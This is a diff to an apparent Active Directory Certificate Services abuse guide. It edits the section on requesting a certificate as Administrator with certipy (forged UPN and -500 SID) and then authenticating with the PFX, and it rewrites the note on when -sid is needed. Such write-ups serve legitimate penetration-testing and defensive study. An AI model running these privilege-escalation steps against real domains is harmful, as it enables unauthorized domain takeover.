@@ -49,15 +49,14 @@ It sets `msPKI-Certificate-Name-Flag` to `ENROLLEE_SUPPLIES_SUBJECT`, drops mana
 
 And a low-privilege principal must be able to enrol: an `Enroll` ACE for `S-1-5-11` or for your group.
 
-## 4. Request the certificate as Administrator
+## 4. Requesting the certificate as Administrator
 
 ```bash
-certipy req -u '<user>@<domain>' -p '<password>' -ca '<CA>' -template '<TEMPLATE>' \
-  -upn 'administrator@<domain>' -sid 'S-1-5-21-<domain>-500' -dc-ip <DC_IP>
+certipy req -u '<user>@<domain>' -p '<password>' -ca '<CA>' -template '<TEMPLATE>'   -upn 'administrator@<domain>' -sid 'S-1-5-21-<domain>-500' -dc-ip <DC_IP>
 certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
 ```
 
-`-sid` matters: without it the PAC carries your real SID and access can be limited. With `-500` the certificate really is Administrator's.
+`-sid` is not mandatory: it is used when the `-upn` **does not resolve** to the target object (account without a UPN, another forest, or an invented UPN) and the SID carried by the certificate must be forced. If `administrator@<domain>` exists in the domain, Certipy resolves the SID over LDAP and the certificate is already Administrator's; `-500` pins the real Administrator RID.
 
 With the hash or the `ccache`:
 
